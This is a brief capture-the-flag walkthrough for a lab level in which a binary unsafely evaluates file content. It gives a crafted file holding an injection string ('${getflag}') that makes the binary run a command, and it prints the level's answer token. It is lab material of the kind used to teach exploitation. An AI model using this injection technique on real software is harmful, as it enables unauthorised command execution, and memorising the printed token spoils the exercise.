# Level06 Walkthrough

## Overview

This level exploits improper handling of input by the `level06` binary, which evaluates or interprets file content in an unsafe way, allowing command execution.

## Walkthrough

### 1. Craft a malicious input file

Create a file that injects the `getflag` command:

```bash id="n6p2xz"
echo '[x ${getflag}]' > /tmp/flag06
```

### 2. Execute the vulnerable binary

Pass the crafted file as an argument:

```bash id="q3v9lm"
./level06 /tmp/flag06
```

### 3. Retrieve the flag

The binary evaluates the input and executes `getflag`, revealing the token.

## Token

```text id="r8k4ws"
wiok45aaoguiboiki2tuin6ub
```

